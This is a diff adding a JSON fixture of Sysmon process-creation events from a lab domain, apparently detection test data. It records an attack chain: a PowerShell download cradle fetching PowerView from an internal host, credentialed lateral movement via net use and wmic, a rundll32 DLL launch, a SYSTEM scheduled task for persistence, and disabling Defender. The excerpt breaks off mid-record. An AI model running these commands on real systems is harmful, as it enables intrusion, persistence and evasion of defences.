+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "-NoProfile",
+            "-ExecutionPolicy",
+            "Bypass",
+            "-Command",
+            "IEX (New-Object Net.Webclient).DownloadString('http://192.168.50.100/PowerView.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "e3007c8e0098d06abf617eee6f0c5abd",
+            "description": "Windows PowerShell",
+            "original_file_name": "PowerShell.EXE",
+            "company": "Microsoft Corporation"
+          },
+          "name": "powershell.exe",
+          "pid": 5320,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 6,
+          "entity_id": "{88E52A21-9896-6AE0-C404-000000002600}",
+          "hash": {
+            "sha256": "64dd55e1c2373deed25c2776f553c632e58c45e56a0e4639dfd54ee97eab9c19"
+          },
+          "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.Webclient).DownloadString('http://192.168.50.100/PowerView.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose\""
+        },
+        "winlog": {
+          "record_id": "1228612",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows PowerShell",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:02.029\nProcessGuid: {88E52A21-9896-6AE0-C404-000000002600}\nProcessId: 5320\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.Webclient).DownloadString('http://192.168.50.100/PowerView.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=64DD55E1C2373DEED25C2776F553C632E58C45E56A0E4639DFD54EE97EAB9C19,IMPHASH=E3007C8E0098D06ABF617EEE6F0C5ABD\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:02.029Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "64dd55e1c2373deed25c2776f553c632e58c45e56a0e4639dfd54ee97eab9c19",
+            "e3007c8e0098d06abf617eee6f0c5abd"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:09Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-10-27T12:27:02.643Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMElq26L",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\FS01\\C$ /user:C0015\\helpdesk ***"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 2492,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-9896-6AE0-C504-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\FS01\\C$ /user:C0015\\helpdesk ***\""
+        },
+        "winlog": {
+          "record_id": "1228649",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "IntegrityLevel": "System",
+            "TerminalSessionId": "0",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:02.534\nProcessGuid: {88E52A21-9896-6AE0-C504-000000002600}\nProcessId: 2492\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\FS01\\C$ /user:C0015\\helpdesk ***\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:02.534Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:09Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:27:03.651Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMElq26Y",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "type": "filebeat",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create rundll32.exe",
+            "C:\\ProgramData\\143.dll",
+            "DllRegisterServer"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 7988,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 5,
+          "entity_id": "{88E52A21-9897-6AE0-C704-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"rundll32.exe C:\\ProgramData\\143.dll DllRegisterServer\"\""
+        },
+        "winlog": {
+          "record_id": "1228662",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "IntegrityLevel": "System",
+            "TerminalSessionId": "0",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:03.261\nProcessGuid: {88E52A21-9897-6AE0-C704-000000002600}\nProcessId: 7988\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"rundll32.exe C:\\ProgramData\\143.dll DllRegisterServer\"\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:03.261Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:09Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-10-27T12:27:03.651Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMElq27R",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "schtasks /create /s FS01 /u C0015\\helpdesk /p *** /tn C0015Persist /tr cmd.exe",
+            "/c",
+            "C:\\ProgramData\\143.dll /sc onstart /ru SYSTEM /rl HIGHEST /f"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 6020,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 5,
+          "entity_id": "{88E52A21-989A-6AE0-C904-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"schtasks /create /s FS01 /u C0015\\helpdesk /p *** /tn C0015Persist /tr \"cmd.exe /c C:\\ProgramData\\143.dll\" /sc onstart /ru SYSTEM /rl HIGHEST /f\""
+        },
+        "winlog": {
+          "record_id": "1228716",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:06.403\nProcessGuid: {88E52A21-989A-6AE0-C904-000000002600}\nProcessId: 6020\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"schtasks /create /s FS01 /u C0015\\helpdesk /p *** /tn C0015Persist /tr \"cmd.exe /c C:\\ProgramData\\143.dll\" /sc onstart /ru SYSTEM /rl HIGHEST /f\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:06.403Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:09Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-10-27T12:27:06.664Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMElq27i",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create powershell.exe",
+            "-NoProfile",
+            "-Command",
+            "Set-MpPreference",
+            "-DisableRealtimeMonitoring",
+            "$true"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 7424,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 8,
+          "entity_id": "{88E52A21-989A-6AE0-CB04-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"powershell.exe -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring $true\"\""
+        },
+        "winlog": {
+          "record_id": "1228733",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows Command Processor",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
